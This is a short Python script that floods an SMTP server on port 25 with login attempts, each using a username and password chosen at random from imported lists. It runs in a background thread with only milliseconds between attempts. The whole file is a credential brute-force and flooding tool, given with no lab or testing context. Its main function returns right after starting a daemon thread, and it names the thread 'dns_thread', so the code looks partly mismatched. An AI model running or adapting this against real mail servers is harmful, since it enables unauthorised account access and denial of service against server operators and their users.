import smtplib
import random
import threading
import time
from utils import usernames, passwords, SMTP_SERVER_IP

def smtp_flood_work(target_host):
    while True:
        username = random.choice(usernames)
        password = random.choice(passwords)
        server = smtplib.SMTP(target_host, 25)
        try:
            server.login(username, password)
        except:
            ...
        finally:
            server.close()
        time.sleep(random.randrange(5)/1000)

def smtp_flood(target_host):
    t = threading.Thread(target=smtp_flood_work, args=(target_host,), daemon=True)
    t.start()
    return t

def main():
    dns_thread = smtp_flood(SMTP_SERVER_IP)

if __name__ == "__main__":
    main()